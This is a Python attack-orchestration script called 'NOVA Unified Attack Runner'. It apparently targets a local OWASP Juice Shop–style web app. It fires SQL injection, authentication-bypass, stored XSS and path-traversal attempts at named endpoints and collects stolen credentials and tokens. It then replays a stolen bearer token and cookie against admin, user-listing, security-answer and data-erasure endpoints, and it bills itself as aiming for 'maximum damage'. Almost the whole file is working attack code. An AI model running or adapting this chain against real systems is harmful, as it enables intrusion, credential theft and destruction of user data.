#!/usr/bin/env python3
"""
NOVA UNIFIED ATTACK RUNNER v1.0
Combines Exploit Synthesizer + Feedback Cortex in one execution.
Exploit → Extract → Validate → Learn → Chain
Zero tokens. Zero cloud. Maximum damage.
"""

import sys
import json
import time
from datetime import datetime

# Import our modules
from nova_exploit_synthesizer import NovaExploitSynthesizer, EXPLOIT_LIBRARY
from nova_feedback_cortex import NovaFeedbackCortex


class NovaUnifiedAttack:
    """Orchestrates the full attack loop: exploit → learn → chain."""

    def __init__(self, base_url: str = "http://localhost:3000"):
        self.base_url = base_url
        self.synthesizer = NovaExploitSynthesizer(base_url=base_url)
        self.cortex = NovaFeedbackCortex(base_url=base_url)
        self.round = 0

    def phase_one_recon_exploit(self) -> dict:
        """Phase 1: Hit known targets with exploit payloads."""
        print("\n" + "█" * 60)
        print("🛡️  PHASE 1: RECON & EXPLOITATION")
        print("█" * 60)

        targets = [
            {"endpoint": "/rest/products/search", "method": "GET", "params": ["q"], "sink": "sql_injection"},
            {"endpoint": "/rest/user/login", "method": "POST", "params": ["email", "password"], "sink": "auth_bypass"},
            {"endpoint": "/api/Feedbacks", "method": "POST", "params": ["comment"], "sink": "xss_stored"},
            {"endpoint": "/rest/user/change-password", "method": "GET", "params": ["id"], "sink": "auth_bypass"},
            {"endpoint": "/file-serving", "method": "GET", "params": ["file"], "sink": "path_traversal"},
            {"endpoint": "/rest/user/whoami", "method": "GET", "params": [], "sink": "auth_bypass"},
            {"endpoint": "/api/Users", "method": "GET", "params": [], "sink": "auth_bypass"},
            {"endpoint": "/rest/admin/application-configuration", "method": "GET", "params": [], "sink": "auth_bypass"},
        ]

        for target in targets:
            self.synthesizer.exploit_path(
                path=[target],
                sink_type=target["sink"],
                confidence="HIGH",
            )
            time.sleep(0.2)

        return self.synthesizer.results

    def phase_two_learn(self, results: list) -> dict:
        """Phase 2: Process results through feedback cortex."""
        print("\n" + "█" * 60)
        print("🧠 PHASE 2: LEARNING & VALIDATION")
        print("█" * 60)

        report = self.cortex.process_results(results)

        # Show what we stole
        creds = self.cortex.stolen_credentials.get("credentials", [])
        tokens = self.cortex.stolen_credentials.get("tokens", [])

        if creds:
            print(f"\n💎 STOLEN CREDENTIALS: {len(creds)} accounts")
            for cred in creds[:3]:
                print(f"   📧 {cred.get('email')}")

        if tokens:
            print(f"\n🔐 STOLEN TOKENS: {len(tokens)}")
            for token in tokens[:2]:
                print(f"   🎫 {token[:60]}...")

        return report

    def phase_three_escalate(self) -> list:
        """Phase 3: Use stolen credentials to escalate."""
        print("\n" + "█" * 60)
        print("⬆️  PHASE 3: PRIVILEGE ESCALATION")
        print("█" * 60)

        escalation_results = []
        tokens = self.cortex.stolen_credentials.get("tokens", [])

        if not tokens:
            print("[!] No tokens to escalate with. Skipping.")
            return escalation_results

        # Use the first valid token
        token = tokens[0]
        print(f"\n[*] Using token: {token[:50]}...")

        # Admin endpoints to probe with stolen token
        admin_targets = [
            {"endpoint": "/api/Users", "method": "GET", "desc": "User enumeration"},
            {"endpoint": "/rest/admin/application-configuration", "method": "GET", "desc": "App config"},
            {"endpoint": "/rest/admin/application-version", "method": "GET", "desc": "Version info"},
            {"endpoint": "/api/Feedbacks", "method": "GET", "desc": "All feedback"},
            {"endpoint": "/rest/user/erasure-request", "method": "POST", "desc": "Data erasure"},
            {"endpoint": "/api/Challenges", "method": "GET", "desc": "Challenge list"},
            {"endpoint": "/rest/user/security-answer", "method": "GET", "desc": "Security answers"},
        ]

        # Set auth header
        self.synthesizer.session.headers["Authorization"] = f"Bearer {token}"

        for target in admin_targets:
            try:
                url = f"{self.base_url}{target['endpoint']}"
                if target["method"] == "GET":
                    resp = self.synthesizer.session.get(url, timeout=10)
                else:
                    resp = self.synthesizer.session.post(url, timeout=10)

                result = {
                    "endpoint": target["endpoint"],
                    "desc": target["desc"],
                    "status_code": resp.status_code,
                    "length": len(resp.text),
                    "preview": resp.text[:200],
                }
                escalation_results.append(result)

                if resp.status_code == 200:
                    print(f"   ✅ ACCESS GRANTED: {target['desc']} ({resp.status_code}, {len(resp.text)} bytes)")
                    # Quick check for sensitive data
                    if any(word in resp.text.lower() for word in ["password", "admin", "token", "ssn", "credit"]):
                        print(f"      🔥 SENSITIVE DATA EXPOSED!")
                elif resp.status_code == 401:
                    print(f"   ❌ UNAUTHORIZED: {target['desc']}")
                else:
                    print(f"   ⚠️  {target['desc']}: {resp.status_code}")

            except Exception as e:
                print(f"   ❌ ERROR: {target['desc']} - {str(e)[:80]}")

            time.sleep(0.1)

        # Try with token in Cookie too
        if tokens:
            self.synthesizer.session.headers.pop("Authorization", None)
            self.synthesizer.session.cookies.set("token", tokens[0])
            try:
                resp = self.synthesizer.session.get(f"{self.base_url}/api/Users", timeout=10)
                print(f"\n   🍪 Cookie Auth /api/Users: {resp.status_code} ({len(resp.text)} bytes)")
                escalation_results.append({
                    "endpoint": "/api/Users",
                    "method": "GET (Cookie)",
                    "status_code": resp.status_code,
                    "length": len(resp.text),
                })
            except Exception as e:
                print(f"   ❌ Cookie auth failed: {str(e)[:50]}")

        return escalation_results

    def phase_four_report(self, p1_results, p2_report, p3_results) -> dict:
        """Phase 4: Generate final intelligence report."""
        print("\n" + "█" * 60)
        print("📊 PHASE 4: MISSION REPORT")
        print("█" * 60)

        # Count confirmed vulnerabilities
        confirmed = [r for r in p1_results if r.get("success") == True]
        partial_upgraded = p2_report.get("partial_upgraded_to_confirmed", 0)
        total_confirmed = len(confirmed) + partial_upgraded

        report = {
            "mission_timestamp": datetime.now().isoformat(),
            "target": self.base_url,
            "total_exploits_attempted": len(p1_results),
            "vulnerabilities_confirmed": total_confirmed,
            "credentials_stolen": p2_report.get("total_stolen_credentials", 0),
            "tokens_captured": p2_report.get("total_stolen_tokens", 0),
            "escalation_endpoints_accessed": len([r for r in p3_results if r.get("status_code") == 200]),
            "critical_findings": [],
        }

        # Identify critical findings
        for r in p1_results:
            if r.get("success") == True:
                indicators = r.get("indicators_found", [])
                if any(i in indicators for i in ["password", "admin", "token", "root:"]):
                    report["critical_findings"].append({
                        "endpoint": r["endpoint"],
                        "exploit_type": r["exploit_type"],
                        "payload": r["payload"],
                        "data_exposed": indicators,
                    })

        # Add escalation findings
        for r in p3_results:
            if r.get("status_code") == 200:
                report["critical_findings"].append({
                    "endpoint": r["endpoint"],
                    "exploit_type": "privilege_escalation",
                    "payload": "stolen_token",
                    "data_exposed": [r.get("desc", "")],
                })

        # Save final report
        with open("nova_mission_report.json", "w") as f:
            json.dump(report, f, indent=2)

        print(f"""
╔══════════════════════════════════════════╗
║        NOVA MISSION COMPLETE            ║
╠══════════════════════════════════════════╣
║  Exploits Attempted:  {len(p1_results):>3}               ║
║  Vulnerabilities:     {total_confirmed:>3}               ║
║  Credentials Stolen:  {p2_report.get('total_stolen_credentials', 0):>3}               ║
║  Tokens Captured:     {p2_report.get('total_stolen_tokens', 0):>3}               ║
║  Escalation Success:  {len([r for r in p3_results if r.get('status_code') == 200]):>3}               ║
║  Critical Findings:   {len(report['critical_findings']):>3}               ║
╚══════════════════════════════════════════╝
        """)

        return report

    def run_full_mission(self):
        """Execute the complete attack lifecycle."""
        print("""
╔══════════════════════════════════════════════╗
║                                              ║
║   🦅 NOVA UNIFIED ATTACK MISSION 🦅         ║
║   Autonomous Security Assessment            ║
║   Zero Cloud • Zero Tokens • Pure On-Device ║
║                                              ║
╚══════════════════════════════════════════════╝
        """)

        start_time = time.time()

        # Phase 1: Exploit
        p1_results = self.phase_one_recon_exploit()

        # Phase 2: Learn
        p2_report = self.phase_two_learn(p1_results)

        # Phase 3: Escalate
        p3_results = self.phase_three_escalate()

        # Phase 4: Report
        final_report = self.phase_four_report(p1_results, p2_report, p3_results)

        elapsed = round(time.time() - start_time, 2)
        print(f"\n⏱️  Mission completed in {elapsed}s")
        print(f"📁 Full report saved to: nova_mission_report.json")

        return final_report


if __name__ == "__main__":
    nova = NovaUnifiedAttack(base_url="http://localhost:3000")
    report = nova.run_full_mission()

    print("\n🔍 Quick exploit summary:")
    for finding in report.get("critical_findings", []):
        print(f"   💥 {finding['exploit_type']}: {finding['endpoint']}")
        print(f"      Exposed: {finding['data_exposed']}")
